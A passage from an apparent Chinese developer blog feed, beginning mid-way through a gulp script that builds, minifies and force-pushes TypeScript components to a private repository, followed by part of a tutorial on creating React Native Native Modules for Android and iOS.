clean = <span class="built_in">require</span>(<span class="string">&#x27;gulp-clean&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> git = <span class="built_in">require</span>(<span class="string">&#x27;gulp-git&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> tsProject = ts.<span class="title function_">createProject</span>(&#123;</span><br><span class="line">  <span class="attr">noImplicitAny</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">target</span>: <span class="string">&#x27;es6&#x27;</span>,</span><br><span class="line">  <span class="attr">jsx</span>: <span class="string">&#x27;react&#x27;</span>,</span><br><span class="line">  <span class="attr">declaration</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">moduleResolution</span>: <span class="string">&#x27;node&#x27;</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MUST_IGNORE_FILES</span> = [</span><br><span class="line">  <span class="string">&#x27;!./node_modules/**&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;!./dist/**&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;!./.git/**&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;!./.idea/**&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;!./gulpfile.js&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;!./package.json&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;!./yarn.lock&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;!./CHANGELOG.md&#x27;</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ENCRYPT_REPOSITORY_URL</span> = <span class="string">&#x27;git@123.59.xx.xxx:fe/components_encrypt.git&#x27;</span>; <span class="comment">// 目标更新仓库</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ENCRYPT_REPOSITORY_BATCH</span> = <span class="string">&#x27;dev&#x27;</span>; <span class="comment">// 目标更新仓库的分支名（注：该分支不能在 GitLab 中设置为 protected 状态）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pullDev</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  git.<span class="title function_">pull</span>(<span class="string">&#x27;origin&#x27;</span>, <span class="string">&#x27;dev&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">cb</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pullTypes</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  git.<span class="title function_">clone</span>(<span class="string">&#x27;git@123.59.xx.xxx:fe/common_types.git&#x27;</span>, &#123; <span class="attr">args</span>: <span class="string">&#x27;@types&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">cb</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">cleanTypes</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  gulp.<span class="title function_">src</span>(<span class="string">&#x27;@types&#x27;</span>, &#123; <span class="attr">allowEmpty</span>: <span class="literal">true</span> &#125;).<span class="title function_">pipe</span>(<span class="title function_">clean</span>());</span><br><span class="line">  <span class="title function_">cb</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">transTsx</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 添加 ts-ignore 强行阻止编译校验</span></span><br><span class="line">  <span class="keyword">const</span> tsNoCheck = gulp.<span class="title function_">src</span>([<span class="string">&#x27;./**/*.tsx&#x27;</span>, <span class="string">&#x27;./**/*.ts&#x27;</span>, ...<span class="variable constant_">MUST_IGNORE_FILES</span>]).<span class="title function_">pipe</span>(</span><br><span class="line">    through.<span class="title function_">obj</span>(<span class="keyword">function</span> (<span class="params">file, encode, cb</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> result = file.<span class="property">contents</span>.<span class="title function_">toString</span>();</span><br><span class="line">      result = <span class="string">&#x27;// @ts-nocheck\n&#x27;</span> + result;</span><br><span class="line">      file.<span class="property">contents</span> = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(result);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">push</span>(file);</span><br><span class="line">      <span class="title function_">cb</span>();</span><br><span class="line">    &#125;),</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">var</span> tsResult = tsNoCheck.<span class="title function_">pipe</span>(<span class="title function_">tsProject</span>());</span><br><span class="line">  <span class="comment">// 生成 js 文件和 d.ts 文件</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>([</span><br><span class="line">    tsResult.<span class="property">js</span></span><br><span class="line">      .<span class="title function_">pipe</span>(</span><br><span class="line">        <span class="title function_">minify</span>(&#123;</span><br><span class="line">          <span class="attr">ext</span>: &#123;</span><br><span class="line">            <span class="attr">src</span>: <span class="string">&#x27;.js&#x27;</span>,</span><br><span class="line">            <span class="attr">min</span>: <span class="string">&#x27;.js&#x27;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">noSource</span>: <span class="literal">true</span>,</span><br><span class="line">        &#125;),</span><br><span class="line">      )</span><br><span class="line">      .<span class="title function_">pipe</span>(</span><br><span class="line">        <span class="comment">// 编译混淆后的 js 文件禁用 eslint 检查</span></span><br><span class="line">        through.<span class="title function_">obj</span>(<span class="keyword">function</span> (<span class="params">file, encode, cb</span>) &#123;</span><br><span class="line">          <span class="keyword">var</span> result = file.<span class="property">contents</span>.<span class="title function_">toString</span>();</span><br><span class="line">          result = <span class="string">&#x27;/* eslint-disable */&#x27;</span> + result;</span><br><span class="line">          file.<span class="property">contents</span> = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(result);</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">push</span>(file);</span><br><span class="line">          <span class="title function_">cb</span>();</span><br><span class="line">        &#125;),</span><br><span class="line">      )</span><br><span class="line">      .<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;dist&#x27;</span>)),</span><br><span class="line">    tsResult.<span class="property">dts</span>.<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;dist&#x27;</span>)),</span><br><span class="line">  ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">moveOtherFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> gulp</span><br><span class="line">    .<span class="title function_">src</span>([<span class="string">&#x27;./**/*.*&#x27;</span>, <span class="string">&#x27;!./**/*.tsx&#x27;</span>, <span class="string">&#x27;!./**/*.ts&#x27;</span>, <span class="string">&#x27;!./@types/**&#x27;</span>, ...<span class="variable constant_">MUST_IGNORE_FILES</span>], &#123;</span><br><span class="line">      <span class="attr">nodir</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;dist&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">cleanDist</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  gulp.<span class="title function_">src</span>(<span class="string">&#x27;dist&#x27;</span>, &#123; <span class="attr">allowEmpty</span>: <span class="literal">true</span> &#125;).<span class="title function_">pipe</span>(<span class="title function_">clean</span>());</span><br><span class="line">  <span class="title function_">cb</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">initEncryptRepository</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  git.<span class="title function_">init</span>(&#123; <span class="attr">cwd</span>: <span class="string">&#x27;./dist&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">    <span class="title function_">cb</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addOriginEncryptRepositoryUrl</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  git.<span class="title function_">addRemote</span>(<span class="string">&#x27;origin&#x27;</span>, <span class="variable constant_">ENCRYPT_REPOSITORY_URL</span>, &#123; <span class="attr">cwd</span>: <span class="string">&#x27;./dist&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">    <span class="title function_">cb</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkoutEncryptRepositoryDevBatch</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  git.<span class="title function_">checkout</span>(<span class="variable constant_">ENCRYPT_REPOSITORY_BATCH</span>, &#123; <span class="attr">args</span>: <span class="string">&#x27;-b&#x27;</span>, <span class="attr">cwd</span>: <span class="string">&#x27;./dist&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">    <span class="title function_">cb</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addEncryptRepositoryChanges</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.<span class="title function_">src</span>(<span class="string">&#x27;./dist/*&#x27;</span>).<span class="title function_">pipe</span>(</span><br><span class="line">    git.<span class="title function_">add</span>(&#123; <span class="attr">args</span>: <span class="string">&#x27;-f&#x27;</span>, <span class="attr">cwd</span>: <span class="string">&#x27;./dist&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;),</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">commitEncryptRepositoryChanges</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.<span class="title function_">src</span>(<span class="string">&#x27;./dist/*&#x27;</span>).<span class="title function_">pipe</span>(</span><br><span class="line">    git.<span class="title function_">commit</span>(<span class="string">&#x27;ci: update source&#x27;</span>, &#123; <span class="attr">cwd</span>: <span class="string">&#x27;./dist&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;),</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pushEncryptRepositoryChanges</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  git.<span class="title function_">push</span>(<span class="string">&#x27;origin&#x27;</span>, <span class="variable constant_">ENCRYPT_REPOSITORY_BATCH</span>, &#123; <span class="attr">args</span>: <span class="string">&#x27;-u -f&#x27;</span>, <span class="attr">cwd</span>: <span class="string">&#x27;./dist&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_">cb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gulp.<span class="title function_">task</span>(</span><br><span class="line">  <span class="string">&#x27;publish&#x27;</span>,</span><br><span class="line">  gulp.<span class="title function_">series</span>(</span><br><span class="line">    initEncryptRepository,</span><br><span class="line">    addOriginEncryptRepositoryUrl,</span><br><span class="line">    checkoutEncryptRepositoryDevBatch,</span><br><span class="line">    addEncryptRepositoryChanges,</span><br><span class="line">    commitEncryptRepositoryChanges,</span><br><span class="line">    pushEncryptRepositoryChanges,</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">gulp.<span class="title function_">task</span>(<span class="string">&#x27;build&#x27;</span>, gulp.<span class="title function_">series</span>(cleanDist, pullDev, pullTypes, transTsx, moveOtherFile, cleanTypes));</span><br></pre></td></tr></table></figure><p>最终我们可以在控制台使用 <code>npx gulp build &amp;&amp; npx gulp publish</code> 来编译并且同步更新我们的代码，我们可以使用 ci 来监听代码库的变更，如果发生变更，ci 就自动切换到 <code>encrypt</code> 分支来执行该指令，对代码进行编译并同步到加密库。</p>]]></content>
      
      
      <categories>
          
          <category> 项目实践 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> gulp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始创建一个 React Native Native Modules</title>
      <link href="/2021/07/275a5abe2cc8.html"/>
      <url>/2021/07/275a5abe2cc8.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-什么是-Native-Modules"><a href="#1-什么是-Native-Modules" class="headerlink" title="1. 什么是 Native Modules"></a>1. 什么是 Native Modules</h1><p>首先我们要明白 Native Native 之所以能够跨端调用 Android、iOS 的能力，就是因为 Javascript 只是提供了 Bridge 层的调用，具体的实现代码还是由原生的 Android、iOS 代码来实现的：</p><p><img src="https://i.loli.net/2021/07/01/rgtEAhVUc3mTiy7.png" alt=""></p><p>因此，理论上如果我们编写了一个使用 Android 或 iOS 的原生代码，只要为其建立 Javascript 层的 Bridge，那么我们就可以通过 Javascript 层的代码来调用这些原生代码的能力。而 Native Modules 正是为我们来实现这一目标的。</p><p>Native Modules 是一个很令人兴奋的能力，但是代价就是我们始终要开发并维护两套代码，并让他们在 Javascript 层合二为一。因此社区上便出现了两种包：一种是普通的组件包，其本质还是 Javascript 代码，调用的是 React Native 封装好的逻辑（如：react-native-scrollable-tab-view）；而另一种就是基于 Native Modules 的包，其不仅由 Javascript 代码进行构建，同时还会使用 Android、iOS 端的原生代码进行构建（这些包之前在社区中是由 rnpm 管理的，但是自 React Native 支持自动 link 后就不存在这种差异了）。区分这两种包的最简单方法就是看其源代码中是否有 <code>android</code> 或 <code>ios</code> 文件夹，如果有，那它就是一个基于 Native Modules 开发的包。</p><h1 id="2-开发一个-Native-Module"><a href="#2-开发一个-Native-Module" class="headerlink" title="2. 开发一个 Native Module"></a>2. 开发一个 Native Module</h1><h2 id="2-1-安卓端-Native-Module"><a href="#2-1-安卓端-Native-Module" class="headerlink" title="2.1 安卓端 Native Module"></a>2.1 安卓端 Native Module</h2><h3 id="2-1-1-编写原生代码"><a href="#2-1-1-编写原生代码" class="headerlink" title="2.1.1 编写原生代码"></a>2.1.1 编写原生代码</h3><p>在 React Native 官方文档的 <a href="https://reactnative.cn/docs/0.46/native-modules-android">Android 原生模块</a> 这一章节中，对如何封装一个 Native Modules 进行了详细的描述，按照指引我们可以封装出来一个 Toast 模块。</p><p>在这里不对文章的内容进行复述（如果你还没有看该文章，快马上看看）总结该文章，其要点分为如下几步：</p><ol><li>创建一个名为 ToastModule 的 Class，在这一步中重点是需要去复写其 <code>getName()</code> 方法来作为JavaScript 端这个模块的标记。之后我们再该类下写的所有方法（被 <code>@ReactMethod</code> 所标记的）最终都会被注册到 Javascript 层调用的这个组件之上，因此它的开发是我们的主要工作。</li><li>创建一个名为 AnExampleReactPackage 的 Class，这一步主要是去注册我们上一步所创建的 Module。</li><li>进入项目的 <code>MainApplication.java</code> 文件中，进行手动连接（这一步就是我们在使用第三方包时执行 react-link 所做的其中一步，我们后续会重提）。</li><li>在 Javascript 中调用 Bridge。</li></ol><p><img src="https://i.loli.net/2021/07/01/M1E42L3OJKUhCXP.png" alt=""></p><p>至此，我们已经完成了一个简单的 Native Modules，打通了 Javascript 与原生层的交互。</p><h3 id="2-1-2-将原生代码改造为-Android-Module"><a href="#2-1-2-将原生代码改造为-Android-Module" class="headerlink" title="2.1.2 将原生代码改造为 Android Module"></a>2.1.2 将原生代码改造为 Android Module</h3><p>在完成了官方文档的《原生模块》这一章节后，我们的 Android 目录下的 java 代码中会是这样的：</p><p><img src="https://i.loli.net/2021/07/01/usFm1PkK9LSgGdI.png" alt=""></p><p>我们新增了 <code>xxxModule.java</code> 与 <code>xxxPackage.java</code> 这两个文件。这里可以发现我们编写的 Native Modules 和原生的代码杂糅在一个文件夹下了，这样不仅会<del>逼死强迫症</del>，同时我们无法将编写好的代码抽离为一个独立的 Modules。</p><p>我们先看一下如果我们项目中引用了别的开发者所开发的 Native Modules，项目的结构是怎么样的，注意这一步我们需要使用 Android Studio 打开项目，并且对项目进行 Sync，当 Sync 完成后我们会看到与 <code>app</code> 同级的目录下多了很多以 <code>react-native</code> 开头的包：</p><p><img src="https://i.loli.net/2021/07/01/QZtdohpy2bOHxW9.png" alt=""></p><p>要想明白这些包是从哪里来的，就需要牵涉出另一个概念，所谓的 “Android 模块化开发”。在安卓应用的开发过程中，我们不可能把所有的代码都塞入到一个目录下，这样不利于项目的模块化，因此在 Android 开发中存在 <strong>Module</strong> 这一概念。<strong>每一个单独的 Module 都拥有独立的 Gradle，以及独立的 Package Name，以及独立的逻辑代码</strong>，它存在的意义仅仅是负责处理一个模块级别的功能。</p><p>当我们对项目右键时，就可以新建一个 Module：</p><p><img src="https://i.loli.net/2021/07/01/1L863TWlQpMabGN.png" alt=""></p><p>如果我们要开发一个 RN 的 Native Modules，这个 Module 将不会包含任何 Active，那我们就可以选择创建一个 Android Library：</p><p><img src="https://i.loli.net/2021/07/01/Nvm9CLauok31FqZ.png" alt=""></p><p>之后你便可以设置一个模块名，这个模块名按照规范应该以 <code>react-native</code> 开头，如 <code>react-native-tester</code>。当创建完成后，需要等待 Android Studio 再次 Sync，此时 Android Studio 替我们做了两步：</p><ul><li>在 <code>android/app</code> 目录下，创建了一个你所命名的模块同名的文件夹，作为你所要搭建的模块的目录。</li><li>在 <code>settings.gradle</code> 中写入了一行 <code>include &#39;:react-native-xxx&#39;</code>，说明你的项目中引用了你刚才所创建的 Module（这也是 React Native 在进行第三方包自动 Link 的其中一步）。</li></ul><p>此时再看我们的工程文件，app 的同级目录下就多了一个名为 <code>react-native-xxx</code> 的 Module。</p><p>由此，我们就可以理解，那些以 <code>react-native</code> 开头的 Module 其实都来自于我们所下载的第三方包，他们本质是存在于 <code>node_modules</code> 目录下的，在项目编译的过程中会被建立了一层链接，从而我们可以在 Android Studio 的工程目录看到他们（这也是 React Native 在进行自动 Link 的功劳）：</p><p><img src="https://i.loli.net/2021/07/01/E4yjhnWLcg5Y8si.png" alt=""></p><p>我们创建了一个独立的 Module 之后，可以先把自创建的测试相关的文件删除掉，这样就得到了一个简洁的目录，同时可以将我们之前写在 app 目录下的代码抽离出去，这样不仅我们的代码结构更清晰了，又可以为单独的 Module 进行独立的 Gradle 配置，不再会依赖主项目的 Gradle 版本。此时，目录结构应该为：</p><p><img src="https://i.loli.net/2021/07/01/OULeCdNKlp5QgGc.png" alt=""></p><p>其实在这一步还有一个难点，就是去配置 Gradle。Gradle 的配置往往比较复杂，具体可以去看官方文档，这里推荐一个配置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果 gradle 版本想要与主项目一致，请删掉 buildscript 配置</span></span><br><span class="line">buildscript &#123;</span><br><span class="line">  <span class="keyword">if</span> (project == rootProject) &#123;</span><br><span class="line">    repositories &#123;</span><br><span class="line">      <span class="title function_">google</span>()</span><br><span class="line">      <span class="title function_">jcenter</span>()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dependencies &#123;</span><br><span class="line">      <span class="comment">// 这里可以单独指定 Module 的 Gradle 版本</span></span><br><span class="line">      <span class="title function_">classpath</span>(<span class="string">&quot;com.android.tools.build:gradle:3.4.2&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">apply <span class="attr">plugin</span>: <span class="string">&#x27;com.android.library&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用这个方法可以获取到主项目的 compileSdkVersion、minSdkVersion 等配置，从而构建一个比较安全的 Gradle 配置</span></span><br><span class="line">def <span class="title function_">safeExtGet</span>(<span class="params">prop, fallback</span>) &#123;</span><br><span class="line">  rootProject.<span class="property">ext</span>.<span class="title function_">has</span>(prop) ? rootProject.<span class="property">ext</span>.<span class="title function_">get</span>(prop) : fallback</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">android &#123;</span><br><span class="line">  compileSdkVersion <span class="title function_">safeExtGet</span>(<span class="string">&#x27;compileSdkVersion&#x27;</span>, <span class="number">28</span>)</span><br><span class="line"></span><br><span class="line">  defaultConfig &#123;</span><br><span class="line">    minSdkVersion <span class="title function_">safeExtGet</span>(<span class="string">&#x27;minSdkVersion&#x27;</span>, <span class="number">21</span>)</span><br><span class="line">    targetSdkVersion <span class="title function_">safeExtGet</span>(<span class="string">&#x27;targetSdkVersion&#x27;</span>, <span class="number">28</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">repositories &#123;</span><br><span class="line">  <span class="comment">// maven 仓库需要定位到 react-native 的目录，否则无法找到 React Native 相关的依赖</span></span><br><span class="line">  maven &#123;</span><br><span class="line">    url <span class="string">&quot;$projectDir/../node_modules/react-native/android&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">mavenCentral</span>()</span><br><span class="line">  <span class="title function_">mavenLocal</span>()</span><br><span class="line">  <span class="title function_">google</span>()</span><br><span class="line">  <span class="title function_">jcenter</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dependencies &#123;</span><br><span class="line">  <span class="comment">// 设置对 react-native 相关包的依赖</span></span><br><span class="line">  implementation <span class="string">&#x27;com.facebook.react:react-native:+&#x27;</span></span><br><span class="line">  <span class="comment">// 在这里可以配置其他依赖，如百度统计的 SDK、支付宝的 SDK 等</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置完 Gradle 后重新编译项目，Make it work.</p><h2 id="2-2-IOS-端-Native-Module"><a href="#2-2-IOS-端-Native-Module" class="headerlink" title="2.2 IOS 端 Native Module"></a>2.2 IOS 端 Native Module</h2><p>React Native 文档中同样有一节 <a href="https://reactnative.cn/docs/native-modules-ios">IOS 原生模块</a> 的文章，但是文章内容还是不太详尽，在本文中我们会对其进行补充。</p><p>IOS 与 Android 的开发不太相同，在 IOS 端的开发过程中，使用了 <code>Pod</code> 来管理 Native 层的依赖，如果我们想运行 IOS 端的项目，你除了要创建好对应的 IOS 开发环境之外，还要在项目的 <code>ios</code> 目录下执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pod install</span></span><br></pre></td></tr></table></figure><p>在代码的执行过程中，ReactNative 在自动为 react native module 创建 Native 层的连接，并下载相关的依赖：</p><p><img src="https://i.loli.net/2021/07/01/Znj8LPe3SgN9hDH.png" alt=""></p><p>当下载完成后，使用 XCode 打开项目 ios 目录的 <code>.xcworkspace</code> 文件，然后可以在文件列表视图中看到已经下载了多个 Pod 的依赖：</p><p><img src="https://i.loli.net/2021/07/01/YwE7TjFd86t2c5b.png" alt=""></p><p>之后我们就可以开发我们的 Native Module 了。首先我们右键项目文件夹，然后点击 <code>New group with folder</code> 来创建一个文件夹 <code>CalendarManager</code>，作为我们 Native Module 所属的文件夹：</p><p><img src="https://i.loli.net/2021/07/01/FfPkClTArRtuaGq.png" alt=""></p><p>然后再右键新创建的文件夹，选择 <code>new file</code>，然后再在弹出的对话框中选择 <code>Cocoa Touch Class</code>：</p><p><img src="https://i.loli.net/2021/07/01/Fo8MyK5SveO7qT9.png" alt=""></p><p>Class 的名称就是我们的模块名，我们在此将其写为 <code>CalendarManager</code>：</p><p><img src="https://i.loli.net/2021/07/01/V6cDnh4MECZNRuY.png" alt=""></p><p>然后我们可以选择将文件创建在某一目录下，但是必须要注意选中下面的 Group 与 Targets 分别我们刚才创建的分组与当前项目：</p><p><img src="https://i.loli.net/2021/07/01/ag6tmIk9H1UicsQ.png" alt=""></p><p>之后我们可以看见对应的 <code>CalendarManager</code> 分组下出现了两个文件，分别为 <code>CalendarManager.h</code> 和 <code>CalendarManager.m</code>：</p><p><img src="https://i.loli.net/2021/07/01/wVmI5h1bYO4aj6L.png" alt=""></p><p>我们分别拷贝如下代码到目标文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// CalendarManager.h</span><br><span class="line">#import &lt;React/RCTBridgeModule.h&gt;</span><br><span class="line"></span><br><span class="line">@interface CalendarManager : NSObject &lt;RCTBridgeModule&gt;</span><br><span class="line">@end</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// CalendarManager.m</span><br><span class="line">#import &quot;CalendarManager.h&quot;</span><br><span class="line">#import &lt;React/RCTLog.h&gt;</span><br><span class="line"></span><br><span class="line">@implementation CalendarManager</span><br><span class="line"></span><br><span class="line">RCT_EXPORT_MODULE();</span><br><span class="line"></span><br><span class="line">RCT_EXPORT_METHOD(addEvent:(NSString *)name location:(NSString *)location)</span><br><span class="line">&#123;</span><br><span class="line">  RCTLogInfo(@&quot;Pretending to create an event %@ at %@&quot;, name, location);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><p>这样我们就创建了一个原生模块，这个原生模块可以向 XCode 的控制台输出一行文字，我们构建好项目后，只需要在 js 代码中调用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NativeModules</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react-native&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">CalendarManager</span> = <span class="title class_">NativeModules</span>.<span class="property">CalendarManager</span>;</span><br><span class="line"><span class="title class_">CalendarManager</span>.<span class="title function_">addEvent</span>(</span><br><span class="line">  <span class="string">&#x27;Birthday Party&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;4 Privet Drive, Surrey&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>XCode 的控制台便可以输出：</p><p><img src="https://i.loli.net/2021/07/01/iJpFf56t9B7Y3Xb.png" alt=""></p><p>如果在 JS 中调用的 Native Module 报错，其输出是一个 null，尝试一下清空 XCode 缓存（<code>调用：rm -rf ~/Library/Developer/Xcode/DerivedData/*</code>）然后再重新构建，如果还不行，尝试清空 Pod 缓存并重新安装 Pod 依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 清空 Pod 缓存</span><br><span class="line">rm -rf ~/Library/Caches/CocoaPods; </span><br><span class="line">rm -rf Pods; </span><br><span class="line">rm -rf ~/Library/Developer/Xcode/DerivedData/*; </span><br><span class="line">pod deintegrate; </span><br><span class="line">pod setup; </span><br><span class="line">pod install;</span><br></pre></td></tr></table></figure><p>关于更多的需求，包括如何在 Native Module 中使用变量，请参考官方文档。</p><blockquote><p>PS：IOS 可以将 Native Module 创建为一个静态库来实现模块化管理（类似 Android Module），但是由于在实验过程中，会出现无法找到 React 依赖的问题（参考：<a href="https://github.com/yorkie/react-native-wechat/issues/33，经过实验">https://github.com/yorkie/react-native-wechat/issues/33，经过实验</a> react-native 0.63.1 通过设定 header link path 还是无法解决），这个我们后续再讲吧。</p></blockquote><h1 id="3-我想要一个-NPM-Package"><a href="#3-我想要一个-NPM-Package" 